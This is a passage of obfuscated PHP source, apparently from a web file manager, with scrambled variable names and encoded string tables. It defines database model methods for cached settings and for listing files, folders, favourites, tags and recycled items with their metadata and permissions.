$«çê×â[$Éñîıñ] : null : $«çê×â; } $¤¬‚®É§ = $this->filterWhere(array($Ê¾êŒéÀ[33] => $¯¯Ğöòâ)); $«çê×â = $this->where($¤¬‚®É§)->select(); $«çê×â = array_to_keyvalue($«çê×â, $Ê¾êŒéÀ[94], $Ê¾êŒéÀ[417]); foreach ($«çê×â as $åˆÈÖ => $À²‰àÂ²) { if ($ßç’¡Ì || in_array($åˆÈÖ, $this->jsonField)) { $«çê×â[$åˆÈÖ] = json_decode($À²‰àÂ², !0); } } $this->cacheSet($¯¯Ğöòâ, $«çê×â); $«çê×â = array_merge($ĞŞ²ãšæ, $«çê×â); return $Éñîıñ ? $«çê×â[$Éñîıñ] : $«çê×â; } public function set($òÍÙ¾Ò, $ˆÀ‰ïàô = false, $¶†–É‰Ş = '') { $ÆŠƒóì =& $_SERVER[”ôÑ§ì¸]; $this->cacheRemove($¶†–É‰Ş); $Ù’‹¡ê¦ = array(); $¥ó“¦¢í = is_array($òÍÙ¾Ò) ? $òÍÙ¾Ò : array($òÍÙ¾Ò => $ˆÀ‰ïàô); foreach ($¥ó“¦¢í as $¶‚¢Ó›Ê => $Ğª½ƒãÌ) { if (is_array($Ğª½ƒãÌ)) { $Ğª½ƒãÌ = json_encode_force($Ğª½ƒãÌ); } $this->checkLength($Ğª½ƒãÌ, !1, $this->tableName . $ÆŠƒóì[4] . $òÍÙ¾Ò); $Ğª½ƒãÌ = self::textEncode($Ğª½ƒãÌ); $¥ó“¦¢í = array($ÆŠƒóì[33] => $¶†–É‰Ş, $ÆŠƒóì[94] => $¶‚¢Ó›Ê, $ÆŠƒóì[417] => $Ğª½ƒãÌ); $Ù’‹¡ê¦[] = $this->filterWhere($¥ó“¦¢í); } if (!$Ù’‹¡ê¦) { return !0; } $ËÖ÷§å„ = $this->cacheKey($ÆŠƒóì[443]); CacheLock::lock($ËÖ÷§å„); $Ú‚öÇö = $this->addAll($Ù’‹¡ê¦, array(), !0); CacheLock::unlock($ËÖ÷§å„); return $Ú‚öÇö; } protected function optionDefault($Ã£»éå = '') { return !1; } public function setDeep($‰Ë£„æà, $ÁÏŠ¿èù = false, $¨›²¹© = '') { $Ò×«¨ê« = explode($_SERVER[”ôÑ§ì¸][10], $‰Ë£„æà); $Ë›¶Ü = $this->get(); array_set_value($Ë›¶Ü, $‰Ë£„æà, $ÁÏŠ¿èù); $this->set($Ò×«¨ê«[0], $Ë›¶Ü[$Ò×«¨ê«[0]], $¨›²¹©); } public function remove($ÃôôÔÛ¹, $¢½†Åğ‚ = '') { $øÈº¼ò =& $_SERVER[”ôÑ§ì¸]; $this->cacheRemove($¢½†Åğ‚); $¿¯’ˆÊ = $this->filterWhere(array($øÈº¼ò[94] => $ÃôôÔÛ¹, $øÈº¼ò[33] => $¢½†Åğ‚)); if (is_null($ÃôôÔÛ¹)) { unset($¿¯’ˆÊ[$øÈº¼ò[94]]); } return $this->where($¿¯’ˆÊ)->delete(); } public function cacheSet($¯Ÿ½ŒÃ‘, $Ü”ÙËÉ = false) { return Cache::set($this->cacheKey($¯Ÿ½ŒÃ‘), $Ü”ÙËÉ); } public function cacheGet($À®Šè‡×) { return Cache::get($this->cacheKey($À®Šè‡×)); } public function cacheRemove($ƒá˜Í³Å) { return Cache::remove($this->cacheKey($ƒá˜Í³Å)); } protected function filterWhere($”á¯––¹) { return $”á¯––¹; } protected function cacheKey($‚ììÊÖı) { return $‚ììÊÖı; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\143\x65"; protected $tableMeta = array("\164\141\142\154\x65\116\141\155\x65" => "\x69\157\137\x73\157\165\162\x63\x65\137\155\145\x74\141", "\155\x65\x74\x61\x46\x69\x65\x6c\144" => "\x73\157\165\162\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\151\x6d\145", "\x74\151\x6d\145", "\151\156\163\145\162\164", "\146\x75\156\143\164\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\145\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\x65\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x76\151\x65\167\124\x69\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\156\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($›£ôıÃà) { return $this->listSource(array($_SERVER[”ôÑ§ì¸][444] => $›£ôıÃà)); } public function typeName($°ÑØ‘–€) { static $¹¢¬“—Ş = array(self::TYPE_SYSTEM => "\163\x79\163\164\145\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $¹¢¬“—Ş[$°ÑØ‘–€ . $_SERVER[”ôÑ§ì¸][12]]; } public function sourceListInfo($±¡¬âã¬, $Êø¼¹´’ = false) { $µ›Ë î =& $_SERVER[”ôÑ§ì¸]; $±¡¬âã¬ = $±¡¬âã¬ ? $±¡¬âã¬ : array(); $±¡¬âã¬ = array_filter(array_unique($±¡¬âã¬)); if (!$±¡¬âã¬) { return array(); } $ÈÎÕ‚ˆÖ = $this->where(array($µ›Ë î[180] => array($µ›Ë î[7], $±¡¬âã¬)))->select(); $this->_listDataApply($ÈÎÕ‚ˆÖ, $Êø¼¹´’); return array_to_keyvalue($ÈÎÕ‚ˆÖ, $µ›Ë î[180]); } public function pathInfoFilter(&$ÎÔòÌ©á) { $ıÆïƒÏß =& $_SERVER[”ôÑ§ì¸]; static $—¬Õ™âÙ = false; static $‚Öç™¤³ = false; static $³ıÊ»Š× = false; if (!$—¬Õ™âÙ) { $”÷æ³ü = $ıÆïƒÏß[445]; $”÷æ³ü .= $ıÆïƒÏß[446]; $”÷æ³ü .= $ıÆïƒÏß[447]; $ı¡öÙ˜« = $ıÆïƒÏß[448]; $–„îˆÕŸ = explode($ıÆïƒÏß[50], $ı¡öÙ˜«); $—¬Õ™âÙ = explode($ıÆïƒÏß[50], $”÷æ³ü); $‚Öç™¤³ = array(); foreach ($—¬Õ™âÙ as $É«¾Í®Î) { if (in_array($É«¾Í®Î, $–„îˆÕŸ)) { continue; } $‚Öç™¤³[] = $É«¾Í®Î; } $³ıÊ»Š× = explode($ıÆïƒÏß[50], $ıÆïƒÏß[449]); } foreach ($³ıÊ»Š× as $òé›’ßß) { if (isset($ÎÔòÌ©á[$òé›’ßß])) { $ÎÔòÌ©á[$òé›’ßß] = intval($ÎÔòÌ©á[$òé›’ßß]); } } $ÎÔòÌ©á[$ıÆïƒÏß[84]] = $ıÆïƒÏß[450] . $ÎÔòÌ©á[$ıÆïƒÏß[180]] . $ıÆïƒÏß[451]; $ÎÔòÌ©á[$ıÆïƒÏß[33]] = $ÎÔòÌ©á[$ıÆïƒÏß[452]] == 1 ? $ıÆïƒÏß[75] : $ıÆïƒÏß[213]; $ÎÔòÌ©á[$ıÆïƒÏß[177]] = $this->typeName($ÎÔòÌ©á[$ıÆïƒÏß[177]]); if ($ÎÔòÌ©á[$ıÆïƒÏß[452]] != 1) { $ÎÔòÌ©á[$ıÆïƒÏß[174]] = $ÎÔòÌ©á[$ıÆïƒÏß[453]]; unset($ÎÔòÌ©á[$ıÆïƒÏß[453]]); } $¼·ì§–å = $—¬Õ™âÙ; if (isset($ÎÔòÌ©á[$ıÆïƒÏß[454]]) && $ÎÔòÌ©á[$ıÆïƒÏß[454]][$ıÆïƒÏß[455]] == -1) { $¼·ì§–å = $‚Öç™¤³; } $ÎÔòÌ©á = array_field_key($ÎÔòÌ©á, $¼·ì§–å); return $ÎÔòÌ©á; } public function listUserFav() { $ãø·Âç =& $_SERVER[”ôÑ§ì¸]; $ÕÚÙ‹¡Å = Model($ãø·Âç[456])->listData(); $öìó’Êí = array_filter_by_field($ÕÚÙ‹¡Å, $ãø·Âç[33], $ãø·Âç[457]); $öìó’Êí = array_to_keyvalue($öìó’Êí, $ãø·Âç[12], $ãø·Âç[84]); if ($öìó’Êí) { $³Û‚ß‹ø = $this->listSource(array($ãø·Âç[458] => array($ãø·Âç[459], $öìó’Êí))); } $³Û‚ß‹ø = array_to_keyvalue($³Û‚ß‹ø[$ãø·Âç[412]], $ãø·Âç[180]); foreach ($ÕÚÙ‹¡Å as &$Õê…¤¡¨) { $Õê…¤¡¨ = array($ãø·Âç[460] => $Õê…¤¡¨[$ãø·Âç[442]], $ãø·Âç[461] => $Õê…¤¡¨[$ãø·Âç[32]], $ãø·Âç[462] => $Õê…¤¡¨[$ãø·Âç[84]], $ãø·Âç[463] => $Õê…¤¡¨[$ãø·Âç[33]], $ãø·Âç[464] => $Õê…¤¡¨[$ãø·Âç[214]], $ãø·Âç[465] => $Õê…¤¡¨[$ãø·Âç[85]]); if ($Õê…¤¡¨[$ãø·Âç[33]] == $ãø·Âç[457] && $³Û‚ß‹ø[$Õê…¤¡¨[$ãø·Âç[84]]]) { $Õê…¤¡¨[$ãø·Âç[87]] = $³Û‚ß‹ø[$Õê…¤¡¨[$ãø·Âç[84]]]; } } unset($Õê…¤¡¨); return $ÕÚÙ‹¡Å; } public function listUserTag($š½Àı¼×) { $ÓÊúŞÆ¯ =& $_SERVER[”ôÑ§ì¸]; if ($š½Àı¼× && !is_array($š½Àı¼×)) { $š½Àı¼× = array($š½Àı¼×); } $ÍØ‹ä±† = Model($ÓÊúŞÆ¯[466])->listData(); $®ö‰Û·ä = array(); $Î“”Şµ® = array(); foreach ($ÍØ‹ä±† as $Ï½ğ¦‘˜) { $ıá©ö©Û = $Ï½ğ¦‘˜[$ÓÊúŞÆ¯[84]]; if (!$ıá©ö©Û) { continue; } if (!isset($Î“”Şµ®[$ıá©ö©Û])) { $Î“”Şµ®[$ıá©ö©Û] = array(); } $Î“”Şµ®[$ıá©ö©Û][] = $Ï½ğ¦‘˜[$ÓÊúŞÆ¯[467]]; $®ö‰Û·ä[$Ï½ğ¦‘˜[$ÓÊúŞÆ¯[84]]] = $Ï½ğ¦‘˜; } $û—Šß›œ = array(); $­Îş®Ú„ = array(); $‚·œÆ¤Ä = array(); foreach ($Î“”Şµ® as $¦àêøÊ => $¦€ˆ‡®¾) { $ªá®åÚš = !0; if (!$š½Àı¼×) { $û—Šß›œ[] = $¦àêøÊ; continue; } foreach ($š½Àı¼× as $‘¸‘Ö×…) { if (!in_array($‘¸‘Ö×…, $¦€ˆ‡®¾)) { $ªá®åÚš = !1; break; } } if (!$ªá®åÚš) { continue; } if (!is_numeric($¦àêøÊ)) { $×šŠ©ä· = $®ö‰Û·ä[$¦àêøÊ]; $À³÷á“£ = array($ÓÊúŞÆ¯[32] => $×šŠ©ä·[$ÓÊúŞÆ¯[32]], $ÓÊúŞÆ¯[84] => $×šŠ©ä·[$ÓÊúŞÆ¯[84]], $ÓÊúŞÆ¯[33] => $×šŠ©ä·[$ÓÊúŞÆ¯[33]], $ÓÊúŞÆ¯[87] => array($ÓÊúŞÆ¯[468] => 1), $ÓÊúŞÆ¯[215] => !0); if ($×šŠ©ä·[$ÓÊúŞÆ¯[33]] == $ÓÊúŞÆ¯[213]) { $‚·œÆ¤Ä[] = $À³÷á“£; } if ($×šŠ©ä·[$ÓÊúŞÆ¯[33]] == $ÓÊúŞÆ¯[75]) { $­Îş®Ú„[] = $À³÷á“£; } continue; } $û—Šß›œ[] = $¦àêøÊ; } if ($û—Šß›œ) { $é’µÏ‡† = $this->listSource(array($ÓÊúŞÆ¯[458] => array($ÓÊúŞÆ¯[459], $û—Šß›œ))); } $é’µÏ‡† = $é’µÏ‡† ? $é’µÏ‡† : array($ÓÊúŞÆ¯[82] => array(), $ÓÊúŞÆ¯[83] => array()); $é’µÏ‡†[$ÓÊúŞÆ¯[82]] = array_merge($é’µÏ‡†[$ÓÊúŞÆ¯[82]], $­Îş®Ú„); $é’µÏ‡†[$ÓÊúŞÆ¯[83]] = array_merge($é’µÏ‡†[$ÓÊúŞÆ¯[83]], $‚·œÆ¤Ä); if (isset($é’µÏ‡†[$ÓÊúŞÆ¯[409]]) && count($û—Šß›œ) == $é’µÏ‡†[$ÓÊúŞÆ¯[409]][$ÓÊúŞÆ¯[410]]) { return $é’µÏ‡†; } $Å—”š¨ã = array(); $â‚ƒ¡¼ = array_to_keyvalue($é’µÏ‡†[$ÓÊúŞÆ¯[82]], $ÓÊúŞÆ¯[12], $ÓÊúŞÆ¯[180]); $¯íÌÚá– = array_to_keyvalue($é’µÏ‡†[$ÓÊúŞÆ¯[83]], $ÓÊúŞÆ¯[12], $ÓÊúŞÆ¯[180]); $Ò°ßöñÔ = array_merge($¯íÌÚá–, $â‚ƒ¡¼); foreach ($û—Šß›œ as $ıá©ö©Û) { if (!in_array($ıá©ö©Û, $Ò°ßöñÔ)) { $Å—”š¨ã[] = $ıá©ö©Û; } } if ($Å—”š¨ã) { Model($ÓÊúŞÆ¯[469])->removeBySource($Å—”š¨ã); } return $é’µÏ‡†; } public function listUserRecycle() { $“ê€üÔî =& $_SERVER[”ôÑ§ì¸]; $ÄŠ¸ÒÌ = Model($“ê€üÔî[470])->listData(); if (!$ÄŠ¸ÒÌ) { return array(); } $ÃÓÙóéİ = array($“ê€üÔî[458] => array($“ê€üÔî[459], $ÄŠ¸ÒÌ), $“ê€üÔî[471] => 1); return $this->listSource($ÃÓÙóéİ); } public function listSource($ª†ñÄ©€, $ª¾€Ñ–ì = 3000, $è»º…âï = false) { $ÚšœÌÉ =& $_SERVER[”ôÑ§ì¸]; if (!isset($ª†ñÄ©€[$ÚšœÌÉ[472]])) { $ª†ñÄ©€[$ÚšœÌÉ[472]] = 0; } if (isset($ª†ñÄ©€[$ÚšœÌÉ[179]]) && $ª†ñÄ©€[$ÚšœÌÉ[179]] == $ÚšœÌÉ[211]) { $ª†ñÄ©€[$ÚšœÌÉ[453]] = array($ÚšœÌÉ[374], $ÚšœÌÉ[473]); } $õ“Ãôßá = $ÚšœÌÉ[474]; $ß’ìœØ = $this->field($õ“Ãôßá)->_makeOrder()->where($ª†ñÄ©€)->selectPage($ª¾€Ñ–ì); $this->_listPageCheck($ß’ìœØ, $õ“Ãôßá, $ª†ñÄ©€); $this->_listDataApply($ß’ìœØ[$ÚšœÌÉ[412]], $è»º…âï); $this->_listMake($ß’ìœØ); return $ß’ìœØ; } private function _listPageCheck(&$¹øŒˆüÖ, $Ñ¿…²Â†, $û–¿¬Â­) { $à˜³Ô =& $_SERVER[”ôÑ§ì¸]; if (!is_array($¹øŒˆüÖ[$à˜³Ô[409]])) { return; } $ ‘áëÒ = $¹øŒˆüÖ[$à˜³Ô[409]]; if ($ ‘áëÒ[$à˜³Ô[411]] <= 1) { return; } if ($ ‘áëÒ[$à˜³Ô[410]] >= 100000) { return; } if (Model($à˜³Ô[475])->get($à˜³Ô[476]) != $à˜³Ô[477]) { return; } $Ñ¿…²Â† = str_replace(array($à˜³Ô[53], $à˜³Ô[385], $à˜³Ô[245]), $à˜³Ô[12], $Ñ¿…²Â†); $Ñ¿…²Â† = $à˜³Ô[478] . str_replace($à˜³Ô[50], $à˜³Ô[479], $Ñ¿…²Â†) . $à˜³Ô[480]; $Œ€§ç¶“ = $à˜³Ô[481]; $Œ€§ç¶“ = $Œ€§ç¶“ . $à˜³Ô[482]; $”æ¬éÊ = $ ‘áëÒ[$à˜³Ô[406]] * ($ ‘áëÒ[$à˜³Ô[396]] - 1) . $à˜³Ô[50] . $ ‘áëÒ[$à˜³Ô[406]]; $»Îù÷¥ˆ = $this->_makeOrder(!0); $‰«Šæ¹… = $à˜³Ô[478] . str_replace($à˜³Ô[50], $à˜³Ô[479], $»Îù÷¥ˆ[0]); if (strpos($‰«Šæ¹…, $à˜³Ô[483])) { $‰«Šæ¹… = str_replace($à˜³Ô[483], $à˜³Ô[484], $‰«Šæ¹…); } else { $‰«Šæ¹… .= $à˜³Ô[485] . $»Îù÷¥ˆ[1]; } $÷‰şœ¨ = array(); foreach ($û–¿¬Â­ as $øŞÀÒ•î => $²œ¸ÄÉş) { $÷‰şœ¨[$à˜³Ô[478] . $øŞÀÒ•î] = $²œ¸ÄÉş; } $this->alias($à˜³Ô[486])->field($Ñ¿…²Â†)->limit($”æ¬éÊ)->order($‰«Šæ¹…); $ò­Û„¿ = $this->join($Œ€§ç¶“)->where($÷‰şœ¨)->select(); if ($ò­Û„¿) { $¹øŒˆüÖ[$à˜³Ô[412]] = $ò­Û„¿; } } protected function _makeOrder($õ¹¯Ñ¦á = false) { $œËÉ´‰Ğ =& $_SERVER[”ôÑ§ì¸]; $Ôõ¶®Éƒ = Model($œËÉ´‰Ğ[487])->get($œËÉ´‰Ğ[488]); $Î°Åù±Ê = Model($œËÉ´‰Ğ[487])->get($œËÉ´‰Ğ[489]); $²ô¸¶ğ = array($œËÉ´‰Ğ[490] => $œËÉ´‰Ğ[491], $œËÉ´‰Ğ[492] => $œËÉ´‰Ğ[493]); $¬ĞÉÄ¾à = array($œËÉ´‰Ğ[32] => $œËÉ´‰Ğ[32], $œËÉ´‰Ğ[76] => $œËÉ´‰Ğ[76], $œËÉ´‰Ğ[174] => $œËÉ´‰Ğ[453], $œËÉ´‰Ğ[494] => $œËÉ´‰Ğ[494], $œËÉ´‰Ğ[495] => $œËÉ´‰Ğ[496], $œËÉ´‰Ğ[214] => $œËÉ´‰Ğ[214], $œËÉ´‰Ğ[85] => $œËÉ´‰Ğ[85]); $×ßÛü®µ = Input::get($œËÉ´‰Ğ[497], $œËÉ´‰Ğ[7], $Ôõ¶®Éƒ, array_keys($¬ĞÉÄ¾à)); $¤¯ô¯Ç– = Input::get($œËÉ´‰Ğ[498], $œËÉ´‰Ğ[7], $Î°Åù±Ê, array_keys($²ô¸¶ğ)); if (!in_array($×ßÛü®µ, array_keys($¬ĞÉÄ¾à))) { $×ßÛü®µ = $œËÉ´‰Ğ[32]; } if (!in_array($¤¯ô¯Ç–, array_keys($²ô¸¶ğ))) { $×ßÛü®µ = $œËÉ´‰Ğ[490]; } if ($×ßÛü®µ == $œËÉ´‰Ğ[32]) { } $—’í˜¹« = $œËÉ´‰Ğ[499] . $¬ĞÉÄ¾à[$×ßÛü®µ] . $œËÉ´‰Ğ[53] . $²ô¸¶ğ[$¤¯ô¯Ç–]; $—’í˜¹« = rtrim(trim($—’í˜¹«), $œËÉ´‰Ğ[50]); if ($õ¹¯Ñ¦á) { return array($—’í˜¹«, $²ô¸¶ğ[$¤¯ô¯Ç–]); } return $this->order($—’í˜¹«); } protected function _listDataApplyItem($ÊÙøÚºï, $¹ºÃ³ö¿ = false) { $Áë×æ÷ = array($ÊÙøÚºï); $this->_listDataApply($Áë×æ÷, $¹ºÃ³ö¿); return $Áë×æ÷[0]; } protected function _listDataApply(&$ßñÃÔı, $‰úŸ´ıì = false) { $ößÜÔÜÊ =& $_SERVER[”ôÑ§ì¸]; if (!$ßñÃÔı) { $ßñÃÔı = array(); return; } $°äôë†Ù = array_to_keyvalue($ßñÃÔı, $ößÜÔÜÊ[12], $ößÜÔÜÊ[180]); $°äôë†Ù = array_unique($°äôë†Ù); $this->_listSourceCache($ßñÃÔı); if (!$‰úŸ´ıì) { $this->_listAppendMeta($ßñÃÔı, $°äôë†Ù); $this->_listAppendFileMeta($ßñÃÔı, $°äôë†Ù); $this->_listAppendChildren($ßñÃÔı, $°äôë†Ù); } $this->_listAppendPath($ßñÃÔı); $this->_listAppendAuth($ßñÃÔı); $this->_listAppendSourceInfo($ßñÃÔı, $°äôë†Ù); $this->_listAppendUser($ßñÃÔı); $this->_listFilterInfo($ßñÃÔı, $‰úŸ´ıì); $this->_listAppendAuthSecret($ßñÃÔı); } protected function _listSourceCache($©ÜÉúÊ£) { $Ğ†àŞİ =& $_SERVER[”ôÑ§ì¸]; foreach ($©ÜÉúÊ£ as $çïïå™À) { self::$cacheSourceInfo[$Ğ†àŞİ[500] . $çïïå™À[$Ğ†àŞİ[180]]] = $çïïå™À; } } protected function _listFilterInfo(&$’Åá—‚·, $Ğ²”æù = false) { $á‰±¿£• =& $_SERVER[”ôÑ§ì¸]; foreach ($’Åá—‚· as &$áËŞÍ˜¥) { $áËŞÍ˜¥ = $this->pathInfoFilter($áËŞÍ˜¥); self::$cachePathInfo[$á‰±¿£•[501] . intval($Ğ²”æù) . $á‰±¿£•[429] . $áËŞÍ˜¥[$á‰±¿£•[180]]] = $áËŞÍ˜¥; } unset($áËŞÍ˜¥); } protected function _listMake(&$Ç¼ëÎÕ¬) { $èÓ–òßü =& $_SERVER[”ôÑ§ì¸]; $Ç¼ëÎÕ¬[$èÓ–òßü[82]] = array(); $Ç¼ëÎÕ¬[$èÓ–òßü[83]] = array(); foreach ($Ç¼ëÎÕ¬[$èÓ–òßü[412]] as $¸ƒÆ³¢Ì) { $‘‡–Œä„ = $¸ƒÆ³¢Ì[$èÓ–òßü[452]] == 1 ? $èÓ–òßü[82] : $èÓ–òßü[83]; $Ç¼ëÎÕ¬[$‘‡–Œä„][] = $¸ƒÆ³¢Ì; } unset($Ç¼ëÎÕ¬[$èÓ–òßü[412]]); } protected function _listAppendMeta(&$»¯—å¸‘, $•Ãœ›¤ı) { $Œ¹„“µı =& $_SERVER[”ôÑ§ì¸]; $Õ¦ˆÏï¹ = array($Œ¹„“µı[458] => array($Œ¹„“µı[459], $•Ãœ›¤ı)); $“˜×µ¨½ = Model($Œ¹„“µı[502])->field($Œ¹„“µı[503])->where($Õ¦ˆÏï¹)->select(); if (!$“˜×µ¨½) { return; } $İ”û„Û® = array($Œ¹„“µı[504], $Œ¹„“µı[505], $Œ¹„“µı[484]); $ú°ñ“²û = array(); foreach ($“˜×µ¨½ as $–¸¥ã£¥) { if (!isset($ú°ñ“²û[$–¸¥ã£¥[$Œ¹„“µı[180]]])) { $ú°ñ“²û[$–¸¥ã£¥[$Œ¹„“µı[180]]] = array(); } if (in_array($–¸¥ã£¥[$Œ¹„“µı[94]], $İ”û„Û®)) { continue; } $ú°ñ“²û[$–¸¥ã£¥[$Œ¹„“µı[180]]][$–¸¥ã£¥[$Œ¹„“µı[94]]] = $–¸¥ã£¥[$Œ¹„“µı[417]]; } foreach ($»¯—å¸‘ as &$óı£œë) { $óı£œë[$Œ¹„“µı[506]] = !1; if (isset($ú°ñ“²û[$óı£œë[$Œ¹„“µı[180]]])) { $óı£œë[$Œ¹„“µı[506]] = $ú°ñ“²û[$óı£œë[$Œ¹„“µı[180]]]; } if ($this->fileIsLock($óı£œë) && $óı£œë[$Œ¹„“µı[454]]) { $ª³³÷ õ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $óı£œë[$Œ¹„“µı[454]][$Œ¹„“µı[455]] = AuthModel::authDisable($óı£œë[$Œ¹„“µı[454]][$Œ¹„“µı[455]], $ª³³÷ õ); $óı£œë[$Œ¹„“µı[454]][$Œ¹„“µı[507]][$Œ¹„“µı[454]] = $óı£œë[$Œ¹„“µı[454]][$Œ¹„“µı[455]]; } } unset($óı£œë); } protected function _listAppendFileMeta(&$ü–Ò¤‚Š, $–ëÊï™Ø) { $È¢÷É·¨ =& $_SERVER[”ôÑ§ì¸]; $’€Á¿úş = array_to_keyvalue($ü–Ò¤‚Š, $È¢÷É·¨[12], $È¢÷É·¨[508]); $’€Á¿úş = array_filter(array_unique($’€Á¿úş)); if (!$’€Á¿úş) { return; } $ÚéÇÄ = array($È¢÷É·¨[509] => array($È¢÷É·¨[459], $’€Á¿úş)); $²•»´ãë = $È¢÷É·¨[510]; $ÀÂ¬¹ñŒ = Model($È¢÷É·¨[511])->field($²•»´ãë)->where($ÚéÇÄ)->select(); $ÀÂ¬¹ñŒ = array_to_keyvalue($ÀÂ¬¹ñŒ, $È¢÷É·¨[508]); $ ôğ£ö = Model($È¢÷É·¨[512])->field($È¢÷É·¨[513])->where($ÚéÇÄ)->select(); $ ôğ£ö = $ ôğ£ö ? $ ôğ£ö : array(); $øû®’¶° = array(); foreach ($ ôğ£ö as $ƒÑ¤»¿•) { if (!isset($øû®’¶°[$ƒÑ¤»¿•[$È¢÷É·¨[508]]])) { $øû®’¶°[$ƒÑ¤»¿•[$È¢÷É·¨[508]]] = array(); } $øû®’¶°[$ƒÑ¤»¿•[$È¢÷É·¨[508]]][$ƒÑ¤»¿•[$È¢÷É·¨[94]]] = $ƒÑ¤»¿•[$È¢÷É·¨[417]]; } foreach ($ü–Ò¤‚Š as &$çËæİä¹) { $ÚÂº®²† = $çËæİä¹[$È¢÷É·¨[508]]; if (!$ÚÂº®²† || !is_array($ÀÂ¬¹ñŒ[$ÚÂº®²†])) { continue; } $î¥´äÉ = $ÀÂ¬¹ñŒ[$ÚÂº®²†]; $î¥´äÉ[$È¢÷É·¨[76]] = $çËæİä¹[$È¢÷É·¨[76]]; $î¥´äÉ[$È¢÷É·¨[32]] = $çËæİä¹[$È¢÷É·¨[32]]; if (!isset(self::$cacheFileInfo[$È¢÷É·¨[514] . $ÚÂº®²†])) { self::$cacheFileInfo[$È¢÷É·¨[514] . $ÚÂº®²†] = array_merge(array(), $î¥´äÉ); } unset($ÀÂ¬¹ñŒ[$ÚÂº®²†][$È¢÷É·¨[84]]); $µî‰áı = is_array($øû®’¶°[$ÚÂº®²†]) ? $øû®’¶°[$ÚÂº®²†] : array(); $çËæİä¹[$È¢÷É·¨[515]] = array_merge($µî‰áı, $ÀÂ¬¹ñŒ[$ÚÂº®²†]); if (isset($çËæİä¹[$È¢÷É·¨[515]][$È¢÷É·¨[170]])) { $çËæİä¹[$È¢÷É·¨[170]] = json_decode($çËæİä¹[$È¢÷É·¨[515]][$È¢÷É·¨[170]], !0); unset($çËæİä¹[$È¢÷É·¨[515]][$È¢÷É·¨[170]]); } } unset($çËæİä¹); } protected function _listAppendSourceInfo(&$¹úšçš, $ú¨üøÎì) { $ùÙ‹ç‹ =& $_SERVER[”ôÑ§ì¸]; $êü¡ÕØš = Model($ùÙ‹ç‹[516])->listData(); $Ãûƒ“¥€ = Model($ùÙ‹ç‹[466])->listData(); $ÛŸé›í = Model($ùÙ‹ç‹[456])->listData(); $Ï‰‘ÛÇß = Model($ùÙ‹ç‹[517])->listSimple(); $€‡¸èÄà = array_to_keyvalue($êü¡ÕØš, $ùÙ‹ç‹[442]); $èØ‹„ÒÉ = array_to_keyvalue_group($Ãûƒ“¥€, $ùÙ‹ç‹[84], $ùÙ‹ç‹[467]); $Ì¸ãÚêœ = array_to_keyvalue($ÛŸé›í, $ùÙ‹ç‹[84]); $™ø¸Ïæú = array_to_keyvalue_group($Ï‰‘ÛÇß, $ùÙ‹ç‹[180]); foreach ($¹úšçš as &$§ûÙ¹) { $§ûÙ¹[$ùÙ‹ç‹[87]] = array($ùÙ‹ç‹[518] => 0, $ùÙ‹ç‹[519] => 0, $ùÙ‹ç‹[520] => 0); if (isset($Ì¸ãÚêœ[$§ûÙ¹[$ùÙ‹ç‹[180]]])) { $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[521]] = 1; $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[522]] = $Ì¸ãÚêœ[$§ûÙ¹[$ùÙ‹ç‹[180]]][$ùÙ‹ç‹[32]]; } if ($èØ‹„ÒÉ && $€‡¸èÄà && isset($èØ‹„ÒÉ[$§ûÙ¹[$ùÙ‹ç‹[180]]])) { $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[523]] = array(); foreach ($èØ‹„ÒÉ[$§ûÙ¹[$ùÙ‹ç‹[180]]] as $Ã‹¾ß¢º) { $¹¼ŞË÷Ô = $€‡¸èÄà[$Ã‹¾ß¢º]; $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[523]][] = array($ùÙ‹ç‹[524] => $¹¼ŞË÷Ô[$ùÙ‹ç‹[442]], $ùÙ‹ç‹[461] => $¹¼ŞË÷Ô[$ùÙ‹ç‹[32]], $ùÙ‹ç‹[525] => $¹¼ŞË÷Ô[$ùÙ‹ç‹[526]]); } } if ($™ø¸Ïæú && isset($™ø¸Ïæú[$§ûÙ¹[$ùÙ‹ç‹[180]]])) { $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[527]] = array(); foreach ($™ø¸Ïæú[$§ûÙ¹[$ùÙ‹ç‹[180]]] as $«ÃÉé¯é) { $ñ™ôãÉ = $ùÙ‹ç‹[528]; if ($«ÃÉé¯é[$ùÙ‹ç‹[529]] == $ùÙ‹ç‹[88]) { $ñ™ôãÉ .= $ùÙ‹ç‹[530]; } $§ûÙ¹[$ùÙ‹ç‹[87]][$ùÙ‹ç‹[527]] = array_field_key($«ÃÉé¯é, explode($ùÙ‹ç‹[50], $ñ™ôãÉ)); } } } unset($§ûÙ¹); return $¹úšçš; } protected function _listAppendChildren(&$‚ª¶£Ÿ¨, $˜ĞØ³) { $…š›è™ó =& $_SERVER[”ôÑ§ì¸]; $í¸ÊŞÍğ = array(); $ë¨‘æÃ = array($…š›è™ó[222] => 0, $…š›è™ó[223] => 0); foreach ($‚ª¶£Ÿ¨ as &$æŸõ¶Óë) { if (!$æŸõ¶Óë[$…š›è™ó[452]]) { continue; } $í¸ÊŞÍğ[] = $æŸõ¶Óë[$…š›è™ó[180]]; } unset($æŸõ¶Óë); if (!$í¸ÊŞÍğ) { return; } $¿òˆûĞÆ = array($…š›è™ó[179] => array($…š›è™ó[7], $í¸ÊŞÍğ), $…š›è™ó[472] => 0); $ÛáÙÇ·¨ = array($…š›è™ó[179], $…š›è™ó[452], $…š›è™ó[531] => $…š›è™ó[532]); $„ûÀÄò = $this->field($ÛáÙÇ·¨)->where($¿òˆûĞÆ)->group($…š›è™ó[533])->select(); $Ä”ÜÀĞ¡ = array(); foreach 